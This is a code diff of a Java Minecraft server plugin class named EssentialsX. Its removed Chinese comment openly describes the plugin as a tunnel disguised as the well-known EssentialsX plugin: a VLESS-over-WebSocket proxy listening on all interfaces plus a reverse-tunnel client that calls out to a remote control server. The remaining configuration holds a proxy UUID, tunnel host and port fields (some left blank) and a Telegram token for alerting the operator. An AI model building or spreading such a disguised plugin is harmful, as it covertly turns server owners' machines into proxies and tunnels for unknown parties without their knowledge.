@@ -22,34 +22,19 @@ import org.java_websocket.handshake.ClientHandshake;
 import org.java_websocket.handshake.ServerHandshake;
 import org.java_websocket.server.WebSocketServer;
 
-/**
- * 伪装成 EssentialsX 的穿透插件（纯 Java，无外部进程）：
- *
- * 1. VLESS-over-WebSocket 服务端  (移植 server.js)
- *    - 客户端连 / 任意路径（不校验 path，和原版一样在 wss.on('connection') 里处理）
- *    - 第一条二进制消息按 VLESS 协议头解析: [VER][UUID 16B][ADDLEN+ADDR][PORT 2B][...][DATA]
- *    - 校验通过后回 [VER, 0]，然后与目标地址双向转发
- *
- * 2. 反向隧道客户端 (移植 client原版.js)
- *    - 连 ws://HOST:PORT/control，收到 {type:"open", sessionId} 后
- *      连 ws://HOST:PORT/data/<sessionId> 并连本地 127.0.0.1:LOCAL_PORT
- *      双向转发；断线 3 秒重连
- */
 public class EssentialsX extends JavaPlugin {
 
     // ================= 配置（编译前自行修改） =================
 
-    // ---- server.js 部分: VLESS/WS 服务端 ----
     static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
-    // VLESS/WS 服务监听端口（监听 0.0.0.0）
     static final int VLESS_PORT = 65534;
 
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
+    // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
     static final String TUNNEL_HOST = "";
     static final int TUNNEL_PORT = ;
     static final int TUNNEL_PORT_INGRESS = ; //填写公网入站端口只用于TG通知
     static final int TUNNEL_LOCAL_PORT = 65534;
-    // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
 
     // ---- Telegram 通知（可留空） ----
     static final String TG_TOKEN = "";
